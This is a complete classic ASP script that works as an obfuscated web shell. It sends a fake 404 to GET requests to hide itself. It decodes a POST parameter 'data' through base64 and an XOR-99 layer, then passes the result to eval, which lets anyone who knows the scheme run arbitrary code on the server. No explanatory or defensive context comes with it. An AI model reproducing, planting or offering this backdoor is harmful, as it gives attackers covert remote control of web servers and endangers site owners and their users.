<%
if Request.ServerVariables("Request_Method")="GET" then:Response.Status="404":end if:
Function Base64Decode(psText)
     dim oXml, oStream, oNode
     Set oXml =Server.CreateObject("MSXML2.DOMDocument")
         Set oStream =Server.CreateObject("ADODB.Stream")
             Set oNode =oXml.CreateElement("tmpNode")
                 oNode.dataType ="bin.base64"
                 oNode.Text =psText
                 oStream.Charset ="gb2312"
                 oStream.Type =1
                 oStream.Open()
                 oStream.Write(oNode.nodeTypedValue)
                 oStream.Position =0
                 oStream.Type =2
                 Base64Decode =oStream.ReadText(-1)
                 oStream.Close
             Set oNode =Nothing
         Set oStream =Nothing
     Set oXml =Nothing
End Function

Public Function decode( byVal strIn )
	if strIn=null or strIn="" or isempty(strIn) then
		decode = strIn
		Exit Function
	end if
	Dim result,i,tmp
	result = ""
	tmp = split(Base64Decode(strIn),"/")
	For i=0 to ubound(tmp) - 1
		result = result & (chr(cint(tmp(i)) xor 99))
	Next
	decode = Base64Decode(result)
End Function

eval decode(request("data"))
%>